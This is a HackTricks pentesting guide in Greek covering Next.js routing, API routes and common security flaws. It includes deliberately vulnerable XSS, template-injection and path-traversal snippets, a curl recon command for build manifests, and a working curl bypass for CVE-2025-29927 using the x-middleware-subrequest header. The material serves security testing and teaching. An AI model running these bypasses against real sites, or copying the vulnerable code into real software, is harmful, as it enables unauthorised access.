# NextJS

{{#include ../../banners/hacktricks-training.md}}

## Γενική Αρχιτεκτονική μιας Next.js Εφαρμογής

### Τυπική Δομή Αρχείων

Ένα τυπικό έργο Next.js ακολουθεί μια συγκεκριμένη δομή αρχείων και φακέλων που διευκολύνει λειτουργίες όπως τη δρομολόγηση, τα API endpoints και τη διαχείριση στατικών πόρων. Ακολουθεί μια τυπική διάταξη:
```lua
my-nextjs-app/
├── node_modules/
├── public/
│   ├── images/
│   │   └── logo.png
│   └── favicon.ico
├── app/
│   ├── api/
│   │   └── hello/
│   │       └── route.ts
│   ├── layout.tsx
│   ├── page.tsx
│   ├── about/
│   │   └── page.tsx
│   ├── dashboard/
│   │   ├── layout.tsx
│   │   └── page.tsx
│   ├── components/
│   │   ├── Header.tsx
│   │   └── Footer.tsx
│   ├── styles/
│   │   ├── globals.css
│   │   └── Home.module.css
│   └── utils/
│       └── api.ts
├── .env.local
├── next.config.js
├── tsconfig.json
├── package.json
├── README.md
└── yarn.lock / package-lock.json

```
### Κύριοι Κατάλογοι και Αρχεία

- **public/:** Φιλοξενεί στατικά αρχεία όπως εικόνες, γραμματοσειρές και άλλα αρχεία. Τα αρχεία εδώ είναι προσβάσιμα στη ρίζα (`/`).
- **app/:** Κεντρικός κατάλογος για τις pages, layouts, components και API routes της εφαρμογής σας. Υιοθετεί το πρότυπο **App Router**, επιτρέποντας προηγμένες δυνατότητες δρομολόγησης και διαχωρισμό των components σε server και client.
- **app/layout.tsx:** Ορίζει το root layout της εφαρμογής σας, περιβάλλοντας όλες τις σελίδες και παρέχοντας συνεπή στοιχεία διεπαφής όπως headers, footers και navigation bars.
- **app/page.tsx:** Λειτουργεί ως σημείο εισόδου για τη ριζική διαδρομή `/`, αποδίδοντας την αρχική σελίδα.
- **app/[route]/page.tsx:** Χειρίζεται στατικές και δυναμικές διαδρομές. Κάθε φάκελος μέσα στο `app/` αντιπροσωπεύει ένα τμήμα διαδρομής, και το `page.tsx` μέσα σε αυτούς τους φακέλους αντιστοιχεί στο component της διαδρομής.
- **app/api/:** Περιέχει API routes, επιτρέποντάς σας να δημιουργήσετε serverless functions που χειρίζονται HTTP requests. Αυτές οι routes αντικαθιστούν τον παραδοσιακό φάκελο `pages/api`.
- **app/components/:** Περιέχει επαναχρησιμοποιήσιμα React components που μπορούν να χρησιμοποιηθούν σε διάφορες σελίδες και layouts.
- **app/styles/:** Περιέχει global CSS αρχεία και CSS Modules για styling σε επίπεδο component.
- **app/utils/:** Περιλαμβάνει βοηθητικές συναρτήσεις, modules και άλλη μη-UI λογική που μπορεί να κοινοποιηθεί σε όλη την εφαρμογή.
- **.env.local:** Αποθηκεύει μεταβλητές περιβάλλοντος ειδικές για το τοπικό development. Αυτές οι μεταβλητές **δεν** δεσμεύονται στο version control.
- **next.config.js:** Εξατομικεύει τη συμπεριφορά του Next.js, συμπεριλαμβανομένων webpack configurations, environment variables και ρυθμίσεων ασφαλείας.
- **tsconfig.json:** Διαμορφώνει τις ρυθμίσεις TypeScript για το project, ενεργοποιώντας type checking και άλλες δυνατότητες TypeScript.
- **package.json:** Διαχειρίζεται τις εξαρτήσεις του project, scripts και metadata.
- **README.md:** Παρέχει τεκμηρίωση και πληροφορίες για το project, συμπεριλαμβανομένων οδηγιών setup, guidelines χρήσης και άλλων σχετικών λεπτομερειών.
- **yarn.lock / package-lock.json:** Κλειδώνουν τις εξαρτήσεις του project σε συγκεκριμένες εκδόσεις, εξασφαλίζοντας συνεπείς εγκαταστάσεις σε διαφορετικά περιβάλλοντα.

## Client-Side in Next.js

### File-Based Routing in the `app` Directory

Ο κατάλογος `app` είναι ο θεμέλιος λίθος της δρομολόγησης στις πρόσφατες εκδόσεις του Next.js. Χρησιμοποιεί το filesystem για να ορίσει routes, κάνοντας τη διαχείριση των διαδρομών διαισθητική και επεκτάσιμη.

<details>

<summary>Διαχείριση της ριζικής διαδρομής /</summary>

**Δομή αρχείων:**
```arduino
my-nextjs-app/
├── app/
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Βασικά Αρχεία:**

- **`app/page.tsx`**: Διαχειρίζεται αιτήματα που απευθύνονται στη ριζική διαδρομή `/`.
- **`app/layout.tsx`**: Ορίζει τη διάταξη για την εφαρμογή, περιβάλλοντας όλες τις σελίδες.

**Υλοποίηση:**
```tsx
tsxCopy code// app/page.tsx

export default function HomePage() {
return (
<div>
<h1>Welcome to the Home Page!</h1>
<p>This is the root route.</p>
</div>
);
}
```
**Εξήγηση:**

- **Ορισμός Route:** Το αρχείο `page.tsx` που βρίσκεται απευθείας στον κατάλογο `app` αντιστοιχεί στη διαδρομή `/`.
- **Rendering:** Αυτό το component αποδίδει το περιεχόμενο για την αρχική σελίδα.
- **Layout Integration:** Το component `HomePage` τυλίγεται από το `layout.tsx`, το οποίο μπορεί να περιλαμβάνει επικεφαλίδες, υποσέλιδα και άλλα κοινά στοιχεία.

</details>

<details>

<summary>Διαχείριση άλλων στατικών διαδρομών</summary>

**Παράδειγμα: Διαδρομή `/about`**

**Δομή Αρχείων:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── about/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Υλοποίηση:**
```tsx
// app/about/page.tsx

export default function AboutPage() {
return (
<div>
<h1>About Us</h1>
<p>Learn more about our mission and values.</p>
</div>
)
}
```
**Επεξήγηση:**

- **Ορισμός Διαδρομής:** Το αρχείο `page.tsx` μέσα στον φάκελο `about` αντιστοιχεί στη διαδρομή `/about`.
- **Απόδοση:** Αυτό το component εμφανίζει το περιεχόμενο για τη σελίδα about.

</details>

<details>

<summary>Δυναμικές Διαδρομές</summary>

Οι δυναμικές διαδρομές επιτρέπουν την διαχείριση διαδρομών με μεταβλητά τμήματα, δίνοντας τη δυνατότητα στις εφαρμογές να εμφανίζουν περιεχόμενο βάσει παραμέτρων όπως IDs, slugs, κ.λπ.

**Παράδειγμα: Διαδρομή `/posts/[id]`**

**File Structure:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── posts/
│   │   └── [id]/
│   │       └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Υλοποίηση:**
```tsx
tsxCopy code// app/posts/[id]/page.tsx

import { useRouter } from 'next/navigation';

interface PostProps {
params: { id: string };
}

export default function PostPage({ params }: PostProps) {
const { id } = params;
// Fetch post data based on 'id'

return (
<div>
<h1>Post #{id}</h1>
<p>This is the content of post {id}.</p>
</div>
);
}
```
**Επεξήγηση:**

- **Δυναμικό τμήμα:** `[id]` δηλώνει ένα δυναμικό τμήμα στη διαδρομή, που καταγράφει την παράμετρο `id` από το URL.
- **Πρόσβαση σε παραμέτρους:** Το αντικείμενο `params` περιέχει τις δυναμικές παραμέτρους, προσβάσιμες μέσα στο component.
- **Ταίριασμα διαδρομής:** Οποιαδήποτε διαδρομή που ταιριάζει με `/posts/*`, όπως `/posts/1`, `/posts/abc`, κ.λπ., θα χειριστεί αυτό το component.

</details>

<details>

<summary>Εμφωλευμένες διαδρομές</summary>

Next.js υποστηρίζει εμφωλευμένη δρομολόγηση, επιτρέποντας ιεραρχικές δομές διαδρομών που αντικατοπτρίζουν τη διάταξη των φακέλων.

**Παράδειγμα: `/dashboard/settings/profile` Διαδρομή**

**Δομή Αρχείων:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── dashboard/
│   │   ├── settings/
│   │   │   └── profile/
│   │   │       └── page.tsx
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Υλοποίηση:**
```tsx
tsxCopy code// app/dashboard/settings/profile/page.tsx

export default function ProfileSettingsPage() {
return (
<div>
<h1>Profile Settings</h1>
<p>Manage your profile information here.</p>
</div>
);
}
```
**Επεξήγηση:**

- **Βαθιά ένθετη δομή:** Το αρχείο `page.tsx` μέσα στο `dashboard/settings/profile/` αντιστοιχεί στη διαδρομή `/dashboard/settings/profile`.
- **Αντανάκλαση ιεραρχίας:** Η δομή του καταλόγου αντικατοπτρίζει τη διαδρομή URL, ενισχύοντας τη συντηρησιμότητα και την σαφήνεια.

</details>

<details>

<summary>Διαδρομές Catch-All</summary>

Οι διαδρομές catch-all χειρίζονται πολλαπλά ένθετα τμήματα ή άγνωστες διαδρομές, προσφέροντας ευελιξία στο χειρισμό διαδρομών.

**Παράδειγμα: `/*` Διαδρομή**

**File Structure:**
```arduino
my-nextjs-app/
├── app/
│   ├── [...slug]/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Υλοποίηση:**
```tsx
// app/[...slug]/page.tsx

interface CatchAllProps {
params: { slug: string[] }
}

export default function CatchAllPage({ params }: CatchAllProps) {
const { slug } = params
const fullPath = `/${slug.join("/")}`

return (
<div>
<h1>Catch-All Route</h1>
<p>You have navigated to: {fullPath}</p>
</div>
)
}
```
**Επεξήγηση:**

- **Catch-All Segment:** `[...slug]` αιχμαλωτίζει όλα τα υπόλοιπα τμήματα διαδρομής ως πίνακα.
- **Usage:** Χρήσιμο για χειρισμό σεναρίων δυναμικής δρομολόγησης όπως μονοπάτια που δημιουργούνται από χρήστες, εμφωλευμένες κατηγορίες, κ.λπ.
- **Route Matching:** Διαδρομές όπως `/anything/here`, `/foo/bar/baz`, κ.λπ., χειρίζονται από αυτό το συστατικό.

</details>

### Πιθανές ευπάθειες στην πλευρά του client

Ενώ το Next.js παρέχει ένα ασφαλές θεμέλιο, λανθασμένες πρακτικές κωδικοποίησης μπορούν να εισαγάγουν ευπάθειες. Βασικές ευπάθειες στην πλευρά του client περιλαμβάνουν:

<details>

<summary>Cross-Site Scripting (XSS)</summary>

Επιθέσεις XSS συμβαίνουν όταν κακόβουλα scripts εισάγονται σε αξιόπιστες ιστοσελίδες. Οι επιτιθέμενοι μπορούν να εκτελέσουν scripts στους browsers των χρηστών, κλέβοντας δεδομένα ή πραγματοποιώντας ενέργειες εκ μέρους του χρήστη.

**Παράδειγμα ευάλωτου κώδικα:**
```jsx
// Dangerous: Injecting user input directly into HTML
function Comment({ userInput }) {
return <div dangerouslySetInnerHTML={{ __html: userInput }} />
}
```
**Why It's Vulnerable:** Η χρήση του `dangerouslySetInnerHTML` με μη αξιόπιστη είσοδο επιτρέπει attackers να εισάγουν malicious scripts.

</details>

<details>

<summary>Client-Side Template Injection</summary>

Συμβαίνει όταν οι user inputs χειρίζονται ακατάλληλα σε templates, επιτρέποντας attackers να εισάγουν και να εκτελέσουν templates ή expressions.

**Παράδειγμα Ευάλωτου Κώδικα:**
```jsx
import React from "react"
import ejs from "ejs"

function RenderTemplate({ template, data }) {
const html = ejs.render(template, data)
return <div dangerouslySetInnerHTML={{ __html: html }} />
}
```
**Γιατί είναι ευάλωτο:** Αν το `template` ή τα `data` περιέχουν κακόβουλο περιεχόμενο, μπορεί να οδηγήσει σε εκτέλεση μη επιθυμητού κώδικα.

</details>

<details>

<summary>Client Path Traversal</summary>

Είναι μια ευπάθεια που επιτρέπει σε επιτιθέμενους να χειρίζονται client-side paths για να εκτελέσουν ανεπιθύμητες ενέργειες, όπως Cross-Site Request Forgery (CSRF). Σε αντίθεση με server-side path traversal, που στοχεύει το filesystem του server, το CSPT επικεντρώνεται στην εκμετάλλευση client-side μηχανισμών για την αναδρομολόγηση νόμιμων API requests σε κακόβουλα endpoints.

**Παράδειγμα Ευάλωτου Κώδικα:**

Μια Next.js εφαρμογή επιτρέπει στους χρήστες να ανεβάζουν και να κατεβάζουν αρχεία. Η λειτουργία download υλοποιείται στο client side, όπου οι χρήστες μπορούν να καθορίσουν το file path του αρχείου προς λήψη.
```jsx
// pages/download.js
import { useState } from "react"

export default function DownloadPage() {
const [filePath, setFilePath] = useState("")

const handleDownload = () => {
fetch(`/api/files/${filePath}`)
.then((response) => response.blob())
.then((blob) => {
const url = window.URL.createObjectURL(blob)
const a = document.createElement("a")
a.href = url
a.download = filePath
a.click()
})
}

return (
<div>
<h1>Download File</h1>
<input
type="text"
value={filePath}
onChange={(e) => setFilePath(e.target.value)}
placeholder="Enter file path"
/>
<button onClick={handleDownload}>Download</button>
</div>
)
}
```
#### Σενάριο επίθεσης

1. **Στόχος του επιτιθέμενου**: Εκτέλεση CSRF attack για να διαγράψει ένα κρίσιμο αρχείο (π.χ., `admin/config.json`) με χειραγωγία του `filePath`.
2. **Εκμετάλλευση CSPT**:
- **Κακόβουλη Είσοδος**: Ο επιτιθέμενος δημιουργεί ένα URL με χειραγωγημένο `filePath` όπως `../deleteFile/config.json`.
- **Προκύπτον API Κλήση**: Ο client-side κώδικας κάνει αίτημα στο `/api/files/../deleteFile/config.json`.
- **Χειρισμός από τον server**: Αν ο server δεν επικυρώνει το `filePath`, επεξεργάζεται το αίτημα, ενδεχομένως διαγράφοντας ή αποκαλύπτοντας ευαίσθητα αρχεία.
3. **Εκτέλεση CSRF**:
- **Δημιουργημένος Σύνδεσμος**: Ο επιτιθέμενος στέλνει στο θύμα έναν σύνδεσμο ή ενσωματώνει κακόβουλο script που ενεργοποιεί το αίτημα λήψης με το χειραγωγημένο `filePath`.
- **Αποτέλεσμα**: Το θύμα άθελά του εκτελεί την ενέργεια, οδηγώντας σε μη εξουσιοδοτημένη πρόσβαση ή διαγραφή αρχείων.

</details>

### Αναγνώριση: ανίχνευση routes σε static export μέσω _buildManifest

Όταν τα `nextExport`/`autoExport` είναι true (static export), το Next.js εκθέτει το `buildId` στο HTML και σερβίρει ένα build manifest στο `/_next/static/<buildId>/_buildManifest.js`. Ο πίνακας `sortedPages` και ο χάρτης route→chunk εκεί απαριθμούν κάθε prerendered σελίδα χωρίς brute force.

- Πάρε το buildId από την root response (συχνά εμφανίζεται στο κάτω μέρος) ή από τα `<script>` tags που φορτώνουν `/_next/static/<buildId>/...`.
- Κατέβασε το manifest και εξήγαγε τις routes:
```bash
build=$(curl -s http://target/ | grep -oE '"buildId":"[^"]+"' | cut -d: -f2 | tr -d '"')
curl -s "http://target/_next/static/${build}/_buildManifest.js" | grep -oE '"(/[a-zA-Z0-9_\[\]\-/]+)"' | tr -d '"'
```
- Χρησιμοποιήστε τις εντοπισμένες διαδρομές (για παράδειγμα `/docs`, `/docs/content/examples`, `/signin`) για να οδηγείτε τις δοκιμές auth και την ανακάλυψη endpoints.

## Διακομιστική πλευρά σε Next.js

### Server-Side Rendering (SSR)

Οι σελίδες αποδίδονται στον διακομιστή σε κάθε αίτημα, εξασφαλίζοντας ότι ο χρήστης λαμβάνει πλήρως αποδοσμένο HTML. Σε αυτήν την περίπτωση θα πρέπει να δημιουργήσετε τον δικό σας προσαρμοσμένο διακομιστή για να επεξεργάζεται τα αιτήματα.

**Use Cases:**

- Δυναμικό περιεχόμενο που αλλάζει συχνά.
- SEO optimization, καθώς οι μηχανές αναζήτησης μπορούν να ανιχνεύσουν την πλήρως αποδοσμένη σελίδα.

**Υλοποίηση:**
```jsx
// pages/index.js
export async function getServerSideProps(context) {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data } }
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Δημιουργία Στατικών Σελίδων (SSG)

Οι σελίδες προ-αποδίδονται κατά το χρόνο κατασκευής (build time), με αποτέλεσμα ταχύτερους χρόνους φόρτωσης και μειωμένο φόρτο στον διακομιστή.

**Περιπτώσεις Χρήσης:**

- Περιεχόμενο που δεν αλλάζει συχνά.
- Ιστολόγια, τεκμηρίωση, σελίδες μάρκετινγκ.

**Υλοποίηση:**
```jsx
// pages/index.js
export async function getStaticProps() {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data }, revalidate: 60 } // Revalidate every 60 seconds
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Serverless λειτουργίες (API Routes)

Το Next.js επιτρέπει τη δημιουργία API endpoints ως serverless λειτουργίες. Αυτές οι λειτουργίες εκτελούνται κατ' απαίτηση χωρίς την ανάγκη ειδικού διακομιστή.

**Περιπτώσεις χρήσης:**

- Διαχείριση υποβολών φορμών.
- Αλληλεπίδραση με βάσεις δεδομένων.
- Επεξεργασία δεδομένων ή ενσωμάτωση με APIs τρίτων.

**Υλοποίηση:**

Με την εισαγωγή του καταλόγου `app` στο Next.js 13, το routing και ο χειρισμός των API έχουν γίνει πιο ευέλικτοι και ισχυροί. Αυτή η σύγχρονη προσέγγιση ευθυγραμμίζεται στενά με το σύστημα δρομολόγησης βάσει αρχείων αλλά εισάγει ενισχυμένες δυνατότητες, συμπεριλαμβανομένης της υποστήριξης για server και client components.

#### Βασικός Route Handler

**Δομή Αρχείων:**
```go
my-nextjs-app/
├── app/
│   └── api/
│       └── hello/
│           └── route.js
├── package.json
└── ...
```
**Υλοποίηση:**
```javascript
// app/api/hello/route.js

export async function POST(request) {
return new Response(JSON.stringify({ message: "Hello from App Router!" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

// Client-side fetch to access the API endpoint
fetch("/api/submit", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ name: "John Doe" }),
})
.then((res) => res.json())
.then((data) => console.log(data))
```
**Επεξήγηση:**

- **Τοποθεσία:** Οι διαδρομές API τοποθετούνται στον κατάλογο `app/api/`.
- **Ονομασία αρχείων:** Κάθε API endpoint βρίσκεται σε δικό του φάκελο που περιέχει ένα αρχείο `route.js` ή `route.ts`.
- **Εξαγόμενες Συναρτήσεις:** Αντί για μία ενιαία default export, εξάγονται συγκεκριμένες συναρτήσεις για HTTP μεθόδους (π.χ. `GET`, `POST`).
- **Χειρισμός Response:** Χρησιμοποιήστε τον constructor `Response` για να επιστρέψετε responses, επιτρέποντας μεγαλύτερο έλεγχο στα headers και τους status codes.

#### Πώς να χειριστείτε άλλες διαδρομές και μεθόδους:

<details>

<summary>Χειρισμός Συγκεκριμένων HTTP Μεθόδων</summary>

Next.js 13+ σάς επιτρέπει να ορίζετε handlers για συγκεκριμένες HTTP μεθόδους μέσα στο ίδιο αρχείο `route.js` ή `route.ts`, προωθώντας πιο καθαρό και οργανωμένο κώδικα.

**Παράδειγμα:**
```javascript
// app/api/users/[id]/route.js

export async function GET(request, { params }) {
const { id } = params
// Fetch user data based on 'id'
return new Response(JSON.stringify({ userId: id, name: "Jane Doe" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function PUT(request, { params }) {
const { id } = params
// Update user data based on 'id'
return new Response(JSON.stringify({ message: `User ${id} updated.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function DELETE(request, { params }) {
const { id } = params
// Delete user based on 'id'
return new Response(JSON.stringify({ message: `User ${id} deleted.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Επεξήγηση:**

- **Πολλαπλές Εξαγωγές:** Κάθε μέθοδος HTTP (`GET`, `PUT`, `DELETE`) έχει τη δική της εξαγόμενη συνάρτηση.
- **Παράμετροι:** Το δεύτερο όρισμα παρέχει πρόσβαση στις παραμέτρους της διαδρομής μέσω του `params`.
- **Βελτιωμένες Απαντήσεις:** Μεγαλύτερος έλεγχος στα αντικείμενα απόκρισης, επιτρέποντας ακριβή διαχείριση των headers και των status codes.

</details>

<details>

<summary>Catch-All και Nested Διαδρομές</summary>

Next.js 13+ υποστηρίζει προχωρημένες δυνατότητες δρομολόγησης όπως catch-all routes και nested API routes, επιτρέποντας πιο δυναμικές και κλιμακώσιμες δομές API.

**Παράδειγμα Catch-All Route:**
```javascript
// app/api/[...slug]/route.js

export async function GET(request, { params }) {
const { slug } = params
// Handle dynamic nested routes
return new Response(JSON.stringify({ slug }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Επεξήγηση:**

- **Σύνταξη:** `[...]` υποδηλώνει ένα catch-all τμήμα, που περιλαμβάνει όλες τις φωλιασμένες διαδρομές.
- **Χρήση:** Χρήσιμο για APIs που πρέπει να χειρίζονται μεταβαλλόμενο βάθος διαδρομών ή δυναμικά τμήματα.

**Παράδειγμα φωλιασμένων διαδρομών:**
```javascript
// app/api/posts/[postId]/comments/[commentId]/route.js

export async function GET(request, { params }) {
const { postId, commentId } = params
// Fetch specific comment for a post
return new Response(
JSON.stringify({ postId, commentId, comment: "Great post!" }),
{
status: 200,
headers: { "Content-Type": "application/json" },
}
)
}
```
**Επεξήγηση:**

- **Βαθιά εμφώλευση:** Επιτρέπει ιεραρχικές δομές API, που αντικατοπτρίζουν τις σχέσεις μεταξύ πόρων.
- **Πρόσβαση Παραμέτρων:** Εύκολη πρόσβαση σε πολλαπλές παραμέτρους διαδρομής μέσω του αντικειμένου `params`.

</details>

<details>

<summary>Χειρισμός API routes στο Next.js 12 και νωρίτερα</summary>

## API Routes στον φάκελο `pages` (Next.js 12 και νωρίτερα)

Πριν το Next.js 13 εισαγάγει τον φάκελο `app` και τις βελτιωμένες δυνατότητες δρομολόγησης, οι API routes ορίζονταν κυρίως μέσα στον φάκελο `pages`. Αυτή η προσέγγιση εξακολουθεί να χρησιμοποιείται ευρέως και υποστηρίζεται στις εκδόσεις Next.js 12 και νωρίτερα.

#### Βασική API Route

**Δομή Αρχείων:**
```go
goCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── hello.js
├── package.json
└── ...
```
**Υλοποίηση:**
```javascript
javascriptCopy code// pages/api/hello.js

export default function handler(req, res) {
res.status(200).json({ message: 'Hello, World!' });
}
```
**Επεξήγηση:**

- **Location:** Οι διαδρομές API βρίσκονται στον κατάλογο `pages/api/`.
- **Export:** Χρησιμοποιήστε `export default` για να ορίσετε τη συνάρτηση χειριστή.
- **Function Signature:** Ο χειριστής λαμβάνει αντικείμενα `req` (HTTP αίτημα) και `res` (HTTP απόκριση).
- **Routing:** Το όνομα αρχείου (`hello.js`) αντιστοιχεί στο endpoint `/api/hello`.

#### Δυναμικές διαδρομές API

**File Structure:**
```bash
bashCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── users/
│           └── [id].js
├── package.json
└── ...
```
**Υλοποίηση:**
```javascript
javascriptCopy code// pages/api/users/[id].js

export default function handler(req, res) {
const {
query: { id },
method,
} = req;

switch (method) {
case 'GET':
// Fetch user data based on 'id'
res.status(200).json({ userId: id, name: 'John Doe' });
break;
case 'PUT':
// Update user data based on 'id'
res.status(200).json({ message: `User ${id} updated.` });
break;
case 'DELETE':
// Delete user based on 'id'
res.status(200).json({ message: `User ${id} deleted.` });
break;
default:
res.setHeader('Allow', ['GET', 'PUT', 'DELETE']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Επεξήγηση:**

- **Δυναμικά Τμήματα:** Τετράγωνες αγκύλες (`[id].js`) υποδεικνύουν δυναμικά τμήματα διαδρομής.
- **Πρόσβαση σε Παραμέτρους:** Χρησιμοποιήστε `req.query.id` για να αποκτήσετε πρόσβαση στη δυναμική παράμετρο.
- **Διαχείριση Μεθόδων:** Χρησιμοποιήστε λογική υπό όρους για να χειριστείτε διαφορετικές HTTP μεθόδους (`GET`, `PUT`, `DELETE`, κ.λπ.).

#### Διαχείριση Διαφορετικών HTTP Μεθόδων

Ενώ το βασικό παράδειγμα API route χειρίζεται όλες τις HTTP μεθόδους μέσα σε μια συνάρτηση, μπορείτε να δομήσετε τον κώδικά σας ώστε να χειρίζεται κάθε μέθοδο ρητά για καλύτερη σαφήνεια και συντηρησιμότητα.

**Παράδειγμα:**
```javascript
javascriptCopy code// pages/api/posts.js

export default async function handler(req, res) {
const { method } = req;

switch (method) {
case 'GET':
// Handle GET request
res.status(200).json({ message: 'Fetching posts.' });
break;
case 'POST':
// Handle POST request
res.status(201).json({ message: 'Post created.' });
break;
default:
res.setHeader('Allow', ['GET', 'POST']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Καλές Πρακτικές:**

- **Διαχωρισμός Ευθυνών:** Διαχωρίστε σαφώς τη λογική για διαφορετικές HTTP μεθόδους.
- **Συνοχή Απαντήσεων:** Διασφαλίστε συνεπή δομή απαντήσεων για ευκολότερη διαχείριση στην πλευρά του client.
- **Διαχείριση Σφαλμάτων:** Διαχειριστείτε ομαλά μη υποστηριζόμενες μεθόδους και απρόβλεπτα σφάλματα.

</details>

### Διαμόρφωση CORS

Ελέγξτε ποιες προελεύσεις μπορούν να έχουν πρόσβαση στις API routes σας, μειώνοντας τις ευπάθειες Cross-Origin Resource Sharing (CORS).

**Κακό Παράδειγμα Διαμόρφωσης:**
```javascript
// app/api/data/route.js

export async function GET(request) {
return new Response(JSON.stringify({ data: "Public Data" }), {
status: 200,
headers: {
"Access-Control-Allow-Origin": "*", // Allows any origin
"Access-Control-Allow-Methods": "GET, POST, PUT, DELETE",
},
})
}
```
Σημειώστε ότι **CORS μπορεί επίσης να ρυθμιστεί σε όλους τους API routes** μέσα στο **`middleware.ts`** αρχείο:
```javascript
// app/middleware.ts

import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(request: NextRequest) {
const allowedOrigins = [
"https://yourdomain.com",
"https://sub.yourdomain.com",
]
const origin = request.headers.get("Origin")

const response = NextResponse.next()

if (allowedOrigins.includes(origin || "")) {
response.headers.set("Access-Control-Allow-Origin", origin || "")
response.headers.set(
"Access-Control-Allow-Methods",
"GET, POST, PUT, DELETE, OPTIONS"
)
response.headers.set(
"Access-Control-Allow-Headers",
"Content-Type, Authorization"
)
// If credentials are needed:
// response.headers.set('Access-Control-Allow-Credentials', 'true');
}

// Handle preflight requests
if (request.method === "OPTIONS") {
return new Response(null, {
status: 204,
headers: response.headers,
})
}

return response
}

export const config = {
matcher: "/api/:path*", // Apply to all API routes
}
```
**Πρόβλημα:**

- **`Access-Control-Allow-Origin: '*'`:** Επιτρέπει σε οποιαδήποτε ιστοσελίδα να έχει πρόσβαση στο API, ενδεχομένως δίνοντας τη δυνατότητα σε κακόβουλες ιστοσελίδες να αλληλεπιδρούν με το API σας χωρίς περιορισμούς.
- **Ευρύ επιτρεπόμενο σύνολο μεθόδων:** Η επιτρέψη όλων των μεθόδων μπορεί να επιτρέψει σε attackers να εκτελέσουν ανεπιθύμητες ενέργειες.

**Πώς οι attackers το εκμεταλλεύονται:**

Attackers μπορούν να δημιουργήσουν κακόβουλες ιστοσελίδες που κάνουν αιτήματα στο API σας, ενδεχομένως να καταχρώνται λειτουργίες όπως ανάκτηση δεδομένων, τροποποίηση δεδομένων ή την ενεργοποίηση ανεπιθύμητων ενεργειών εκ μέρους επαληθευμένων χρηστών.


{{#ref}}
../../pentesting-web/cors-bypass.md
{{#endref}}

### Αποκάλυψη κώδικα server στην πλευρά client

Είναι εύκολο να **χρησιμοποιηθεί κώδικας του server και στον κώδικα που εκτίθεται στον client**, οπότε ο καλύτερος τρόπος για να διασφαλίσετε ότι ένα αρχείο κώδικα δεν θα εκτεθεί ποτέ στην πλευρά του client είναι να χρησιμοποιήσετε αυτό το import στην αρχή του αρχείου:
```js
import "server-only"
```
## Βασικά Αρχεία και ο Ρόλος τους

### `middleware.ts` / `middleware.js`

**Τοποθεσία:** Στη ρίζα του project ή εντός του `src/`.

**Σκοπός:** Εκτελεί κώδικα στη server-side serverless function πριν επεξεργαστεί ένα request, επιτρέποντας εργασίες όπως authentication, redirects, ή τροποποίηση των responses.

**Ροή Εκτέλεσης:**

1. **Incoming Request:** Το middleware παρεμβαίνει στο request.
2. **Processing:** Εκτελεί ενέργειες βάσει του request (π.χ. check authentication).
3. **Response Modification:** Μπορεί να αλλάξει το response ή να περάσει τον έλεγχο στον επόμενο handler.

**Παραδείγματα Χρήσης:**

- Ανακατεύθυνση χρηστών χωρίς authentication.
- Προσθήκη custom headers.
- Καταγραφή των requests.

**Παράδειγμα Διαμόρφωσης:**
```typescript
// middleware.ts
import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(req: NextRequest) {
const url = req.nextUrl.clone()
if (!req.cookies.has("token")) {
url.pathname = "/login"
return NextResponse.redirect(url)
}
return NextResponse.next()
}

export const config = {
matcher: ["/protected/:path*"],
}
```
### Middleware authorization bypass (CVE-2025-29927)

Εάν η εξουσιοδότηση εφαρμόζεται στο middleware, οι επηρεαζόμενες εκδόσεις του Next.js (<12.3.5 / 13.5.9 / 14.2.25 / 15.2.3) μπορούν να παρακαμφθούν με την έγχυση της κεφαλίδας `x-middleware-subrequest`. Το framework θα παραλείψει την αναδρομή του middleware και θα επιστρέψει την προστατευμένη σελίδα.

- Η βασική συμπεριφορά είναι συνήθως μια 307 ανακατεύθυνση σε μια διαδρομή σύνδεσης όπως `/api/auth/signin`.
- Στείλτε μια μεγάλη τιμή `x-middleware-subrequest` (επανέλαβε το `middleware` για να φτάσετε το `MAX_RECURSION_DEPTH`) για να αλλάξετε την απόκριση σε 200:
```bash
curl -i "http://target/docs" \
-H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
```
- Επειδή οι πιστοποιημένες σελίδες τραβούν πολλούς υπο-πόρους, πρόσθεσε το header σε κάθε αίτηση (π.χ., Burp Match/Replace με κενή match string) για να αποτρέψεις τα assets από το να ανακατευθυνθούν.

### `next.config.js`

**Location:** Στη ρίζα του project.

**Purpose:** Διαμορφώνει τη συμπεριφορά του Next.js, ενεργοποιώντας ή απενεργοποιώντας λειτουργίες, προσαρμόζοντας τις ρυθμίσεις του webpack, ορίζοντας environment variables και ρυθμίζοντας διάφορα χαρακτηριστικά ασφαλείας.

**Key Security Configurations:**

<details>

<summary>Κεφαλίδες ασφαλείας</summary>

